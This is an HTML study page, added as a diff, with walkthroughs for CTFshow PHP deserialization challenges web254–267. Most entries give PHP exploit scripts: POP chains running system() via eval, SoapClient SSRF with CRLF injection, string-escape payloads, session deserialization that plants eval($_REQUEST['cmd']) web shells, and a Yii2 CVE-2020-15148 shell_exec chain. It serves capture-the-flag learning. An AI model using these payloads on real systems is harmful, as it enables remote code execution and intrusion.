@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTFshow 反序列化练习 - PHP反序列化学习</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    pre {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-size: 14px;
+    }
+    code {
+      font-family: 'Courier New', monospace;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    .output-block {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+    }
+    details {
+      border: 1px solid #374151;
+      border-radius: 8px;
+      padding: 12px;
+      margin-bottom: 12px;
+      background: #1f2937;
+    }
+    summary {
+      cursor: pointer;
+      font-weight: bold;
+      color: #60a5fa;
+    }
+    summary:hover {
+      color: #93c5fd;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 font-mono">
+  
+  <!-- Header -->
+  <header class="border-b border-gray-700 bg-gray-950/50 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center gap-4">
+        <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+          <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          <span>返回首页</span>
+        </a>
+        <div class="flex-1">
+          <h1 class="text-xl font-bold text-white">CTFshow 反序列化练习 (web254-278)</h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-7xl mx-auto px-6 py-8">
+
+    <!-- 概述 -->
+    <section class="mb-12 animate-fade-in">
+      <div class="bg-blue-900/20 border border-blue-800 rounded-xl p-6 mb-8">
+        <h2 class="text-xl font-bold text-blue-300 mb-3 flex items-center gap-2">
+          <i data-lucide="info" class="w-5 h-5"></i>
+          题目概述
+        </h2>
+        <p class="text-gray-300">
+          以下练习题来自 CTFshow WEB入门反序列化专题，涵盖 <strong class="text-yellow-400">POP链构造</strong>、<strong class="text-yellow-400">字符串逃逸</strong>、<strong class="text-yellow-400">Session反序列化</strong>、<strong class="text-yellow-400">SoapClient利用</strong> 等核心知识点。
+        </p>
+      </div>
+    </section>
+
+    <!-- 题目列表 -->
+    <section class="space-y-6">
+
+      <!-- web254 -->
+      <details class="animate-fade-in" style="animation-delay: 0.05s;">
+        <summary>web254 - 简单登录绕过</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：反序列化基础</h4>
+            <p class="text-gray-400 text-sm">直接利用类属性进行登录</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">源码</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfShowUser</span>{
+    <span class="text keyword">public</span> $<span class="text variable">username</span>=<span class="text string">'xxxxxx'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span>=<span class="text string">'xxxxxx'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">isVip</span>=<span class="text keyword">false</span>;
+
+    <span class="text keyword">public function</span> <span class="text function">login</span>(<span class="text variable">$u</span>,<span class="text variable">$p</span>){
+        <span class="text keyword">if</span>(<span class="text variable">$this</span>->username===<span class="text variable">$u</span>&&<span class="text variable">$this</span>->password===<span class="text variable">$p</span>){
+            <span class="text variable">$this</span>->isVip=<span class="text keyword">true</span>;
+        }
+        <span class="text keyword">return</span> <span class="text variable">$this</span>->isVip;
+    }
+    <span class="text keyword">public function</span> <span class="text function">vipOneKeyGetFlag</span>(){
+        <span class="text keyword">if</span>(<span class="text variable">$this</span>->isVip){
+            <span class="text global">global</span> <span class="text variable">$flag</span>;
+            <span class="text function">echo</span> <span class="text string">"your flag is "</span>.<span class="text variable">$flag</span>;
+        }
+    }
+}
+
+<span class="text variable">$username</span>=<span class="text variable">$_GET</span>[<span class="text string">'username'</span>];
+<span class="text variable">$password</span>=<span class="text variable">$_GET</span>[<span class="text string">'password'</span>];
+<span class="text comment">// payload: ?username=xxxxxx&password=xxxxxx</span></code></pre>
+            </div>
+          </div>
+          <div>
+            <h4 class="text-cyan-400 font-bold mb-2">解题思路</h4>
+            <p class="text-gray-300 text-sm">直接传入 username=xxxxxx&password=xxxxxx 即可触发 vipOneKeyGetFlag()</p>
+          </div>
+        </div>
+      </details>
+
+      <!-- web255 -->
+      <details class="animate-fade-in" style="animation-delay: 0.1s;">
+        <summary>web255 - 反序列化Cookie利用</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：反序列化 + Cookie</h4>
+            <p class="text-gray-400 text-sm">通过Cookie注入反序列化对象，设置isVip=true</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfShowUser</span>{
+    <span class="text keyword">public</span> $<span class="text variable">username</span>=<span class="text string">'xxxxxx'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span>=<span class="text string">'xxxxxx'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">isVip</span>=<span class="text keyword">true</span>;
+}
+<span class="text variable">$a</span>=<span class="text keyword">new</span> <span class="text class-name">ctfShowUser</span>();
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text function">serialize</span>(<span class="text variable">$a</span>));
+<span class="text comment">// Cookie: user=序列化结果</span>
+<span class="text comment">// GET: ?username=xxxxxx&password=xxxxxx</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web256 -->
+      <details class="animate-fade-in" style="animation-delay: 0.15s;">
+        <summary>web256 - username与password不能相等</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：反序列化属性修改</h4>
+            <p class="text-gray-400 text-sm">在序列化中修改username或password，使两者不相等</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfShowUser</span>{
+    <span class="text keyword">public</span> $<span class="text variable">username</span>=<span class="text string">'aaa'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span>=<span class="text string">'bbb'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">isVip</span>=<span class="text keyword">true</span>;
+}
+<span class="text comment">// Cookie: user=序列化结果</span>
+<span class="text comment">// GET: ?username=aaa&password=bbb</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web257 -->
+      <details class="animate-fade-in" style="animation-delay: 0.2s;">
+        <summary>web257 - POP链构造 + 对象注入</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：POP链构造</h4>
+            <p class="text-gray-400 text-sm">backdoor::getinfo &lt;-- ctfShowUser::__destruct &lt;-- ctfShowUser::__construct</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfShowUser</span>{
+    <span class="text keyword">private</span> $<span class="text variable">class</span> = <span class="text string">'backdoor'</span>;
+    <span class="text keyword">public function</span> <span class="text function">__construct</span>(){
+        <span class="text variable">$this</span>-><span class="text keyword">class</span>=<span class="text keyword">new</span> <span class="text class-name">backDoor</span>();
+    }
+    <span class="text keyword">public function</span> <span class="text function">__destruct</span>(){
+        <span class="text variable">$this</span>-><span class="text keyword">class</span>->getInfo();
+    }
+}
+<span class="text keyword">class</span> <span class="text class-name">backDoor</span>{
+    <span class="text keyword">public</span> $<span class="text variable">code</span>=<span class="text string">"system('tac f*');"</span>;
+    <span class="text keyword">public function</span> <span class="text function">getInfo</span>(){
+        <span class="text function">eval</span>(<span class="text variable">$this</span>->code);
+    }
+}
+<span class="text variable">$a</span>=<span class="text keyword">new</span> <span class="text class-name">ctfShowUser</span>();
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text function">serialize</span>(<span class="text variable">$a</span>));</code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web258 -->
+      <details class="animate-fade-in" style="animation-delay: 0.25s;">
+        <summary>web258 - 正则绕过 O:+11</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：正则绕过</h4>
+            <p class="text-gray-400 text-sm">preg_match('/[oc]:\d+:/i') 匹配 O:数字:，用 O:+11 绕过</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">关键代码</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment">// 过滤: preg_match('/[oc]:\d+:/i', $_COOKIE['user'])</span>
+<span class="text comment">// 绕过: str_replace("O:","O:+",$b)</span></code></pre>
+            </div>
+          </div>
+          <div>
+            <h4 class="text-cyan-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text variable">$b</span>=<span class="text function">serialize</span>(<span class="text variable">$a</span>);
+<span class="text variable">$b</span>=<span class="text function">str_replace</span>(<span class="text string">"O:"</span>,<span class="text string">"O:+"</span>,<span class="text variable">$b</span>);
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text variable">$b</span>);</code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web259 -->
+      <details class="animate-fade-in" style="animation-delay: 0.3s;">
+        <summary>web259 - SoapClient + CRLF注入</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：PHP原生类 + CRLF注入</h4>
+            <p class="text-gray-400 text-sm">利用SoapClient原生类触发SSRF，通过CRLF注入添加X-Forwarded-For和POST数据</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text variable">$target</span> = <span class="text string">'http://127.0.0.1/flag.php'</span>;
+<span class="text variable">$post_string</span> = <span class="text string">'token=ctfshow'</span>;
+<span class="text variable">$headers</span> = <span class="text function">array</span>(
+    <span class="text string">'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1'</span>,
+);
+<span class="text variable">$b</span> = <span class="text keyword">new</span> <span class="text class-name">SoapClient</span>(<span class="text keyword">null</span>,<span class="text function">array</span>(
+    <span class="text string">'location'</span> => <span class="text variable">$target</span>,
+    <span class="text string">'user_agent'</span>=><span class="text string">'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'</span>
+        .<span class="text function">join</span>(<span class="text string">'^^'</span>,<span class="text variable">$headers</span>).<span class="text string">'^^Content-Length: '</span>
+        .(<span class="text function">strlen</span>(<span class="text variable">$post_string</span>)).<span class="text string">'^^^^'</span>.<span class="text variable">$post_string</span>,
+    <span class="text string">'uri'</span> => <span class="text string">'aaab'</span>
+));
+<span class="text variable">$aaa</span> = <span class="text function">serialize</span>(<span class="text variable">$b</span>);
+<span class="text variable">$aaa</span> = <span class="text function">str_replace</span>(<span class="text string">'^^'</span>,<span class="text string">"\r\n"</span>,<span class="text variable">$aaa</span>);
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text variable">$aaa</span>);
+<span class="text comment">// GET: ?vip=序列化结果</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web260 -->
+      <details class="animate-fade-in" style="animation-delay: 0.35s;">
+        <summary>web260 - preg_match绕过</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：正则匹配</h4>
+            <p class="text-gray-400 text-sm">直接传入flag字符串触发preg_match</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">源码</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">if</span>(<span class="text function">preg_match</span>(<span class="text string">'/ctfshow_i_love_36D/'</span>,<span class="text function">serialize</span>(<span class="text variable">$_GET</span>[<span class="text string">'ctfshow'</span>]))){
+    <span class="text function">echo</span> <span class="text variable">$flag</span>;
+}
+<span class="text comment">// payload: ?ctfshow=ctfshow_i_love_36D</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web261 -->
+      <details class="animate-fade-in" style="animation-delay: 0.4s;">
+        <summary>web261 - __unserialize绕过 + 弱比较</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：__unserialize优先于__wakeup + 弱类型比较</h4>
+            <p class="text-gray-400 text-sm">0x36d = 877，弱比较 877.php == 877</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfshowvip</span>{
+    <span class="text keyword">public</span> $<span class="text variable">username</span> = <span class="text string">'877.php'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span> = <span class="text string">'&lt;?php eval($_REQUEST[cmd]);?&gt;'</span>;
+}
+<span class="text variable">$a</span> = <span class="text keyword">new</span> <span class="text class-name">ctfshowvip</span>();
+<span class="text function">echo</span> <span class="text function">serialize</span>(<span class="text variable">$a</span>);
+<span class="text comment">// GET: ?vip=序列化结果</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web262 -->
+      <details class="animate-fade-in" style="animation-delay: 0.45s;">
+        <summary>web262 - 反序列化字符串逃逸</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：字符串逃逸</h4>
+            <p class="text-gray-400 text-sm">利用 str_replace('fuck', 'loveU') 使序列化字符串长度发生变化，逃逸出token字段</p>
+          </div>
+          <div>
+            <h4 class="text-cyan-400 font-bold mb-2">原理</h4>
+            <p class="text-gray-300 text-sm">每替换一个'fuck'变成'loveU'，多出1个字符，需要27个'fuck'逃逸27个字符</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">Payload</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment">// 需要逃逸的内容: ";s:5:"token";s:5:"admin";}  共27字符</span>
+<span class="text comment">// payload: t=3fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}</span>
+<span class="text comment">// GET: ?f=1&m=1&t=payload</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web263 -->
+      <details class="animate-fade-in" style="animation-delay: 0.5s;">
+        <summary>web263 - Session反序列化</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：Session反序列化 + session.serialize_handler</h4>
+            <p class="text-gray-400 text-sm">利用inc.php中设置的php序列化引擎，结合User类的file_put_contents写入shell</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">User</span>{
+    <span class="text keyword">public</span> $<span class="text variable">username</span>=<span class="text string">'shell.php'</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span>=<span class="text string">'&lt;?php eval($_REQUEST["cmd"]);?&gt;'</span>;
+}
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text function">base64_encode</span>(<span class="text string">'|'</span>.<span class="text function">serialize</span>(<span class="text keyword">new</span> <span class="text class-name">User</span>())));
+<span class="text comment">// Cookie: limit=生成结果</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web265 -->
+      <details class="animate-fade-in" style="animation-delay: 0.55s;">
+        <summary>web265 - PHP变量引用 &</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：PHP引用 &</h4>
+            <p class="text-gray-400 text-sm">利用 $this->password = &$this->token 使两者指向同一内存，md5赋值后仍相等</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">EXP</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text-gray-500"><?php</span>
+<span class="text keyword">class</span> <span class="text class-name">ctfshowAdmin</span>{
+    <span class="text keyword">public</span> $<span class="text variable">token</span>;
+    <span class="text keyword">public</span> $<span class="text variable">password</span>;
+    <span class="text keyword">public function</span> <span class="text function">__construct</span>(){
+        <span class="text variable">$this</span>->token=<span class="text string">'Leaf'</span>;
+        <span class="text variable">$this</span>->password = &<span class="text variable">$this</span>->token;
+    }
+}
+<span class="text variable">$a</span> = <span class="text keyword">new</span> <span class="text class-name">ctfshowAdmin</span>();
+<span class="text function">echo</span> <span class="text function">urlencode</span>(<span class="text function">serialize</span>(<span class="text variable">$a</span>));
+<span class="text comment">// GET: ?ctfshow=序列化结果</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web266 -->
+      <details class="animate-fade-in" style="animation-delay: 0.6s;">
+        <summary>web266 - PHP类名大小写不敏感 + 属性数量绕过</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：PHP特性 + 异常处理绕过</h4>
+            <p class="text-gray-400 text-sm">类名不区分大小写，修改属性数量绕过throw Exception</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">方法一：大小写绕过</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment">// 将 ctfshow 改为 CTFshow 或 Ctfshow 绕过正则</span>
+<span class="text variable">$cs</span> = <span class="text function">serialize</span>(<span class="text variable">$ctfshow</span>);
+<span class="text comment">// burp发包到 body 中</span></code></pre>
+            </div>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">方法二：属性数量绕过</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment">// O:7:"ctfshow":2:{...} 改为 O:7:"ctfshow":0:{...</span>
+<span class="text comment">// 属性数量从2改为0，破坏序列化结构</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+      <!-- web267 -->
+      <details class="animate-fade-in" style="animation-delay: 0.65s;">
+        <summary>web267 - Yii框架反序列化 (CVE-2020-15148)</summary>
+        <div class="mt-4 space-y-4">
+          <div>
+            <h4 class="text-yellow-400 font-bold mb-2">考点：Yii2框架反序列化RCE</h4>
+            <p class="text-gray-400 text-sm">利用Yii框架的反序列化漏洞链，通过yii\rest\CreateAction调用shell_exec</p>
+          </div>
+          <div>
+            <h4 class="text-green-400 font-bold mb-2">关键触发点</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text comment">// 入口: unserialize(base64_decode($_GET['code']))</span>
+<span class="text comment">// 访问后台弱口令 admin/admin</span>
+<span class="text comment">// URL: ?r=site/about&view-source 查看注入点</span></code></pre>
+            </div>
+          </div>
+          <div>
+            <h4 class="text-cyan-400 font-bold mb-2">EXP结构</h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text keyword">namespace</span> <span class="text class-name">yii\rest</span>{
+    <span class="text keyword">class</span> <span class="text class-name">CreateAction</span>{
+        <span class="text keyword">public</span> $<span class="text variable">checkAccess</span> = <span class="text string">'shell_exec'</span>;
+        <span class="text keyword">public</span> $<span class="text variable">id</span> = <span class="text string">"echo '...' > shell.php"</span>;
+    }
+}
+<span class="text comment">// 完整EXP需要使用生成工具如 yii-unserializeExp</span></code></pre>
+            </div>
+          </div>
+        </div>
+      </details>
+
+    </section>
+
+    <!-- Navigation -->
+    <div class="flex justify-between items-center mt-12 pt-8 border-t border-gray-800">
+      <a href="native-classes.html" class="text-gray-400 hover:text-white flex items-center gap-2">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+        <span>上一节：PHP原生类利用</span>
+      </a>
+      <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+        <span>返回首页</span>
+        <i data-lucide="home" class="w-5 h-5"></i>
+      </a>
+    </div>
+
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
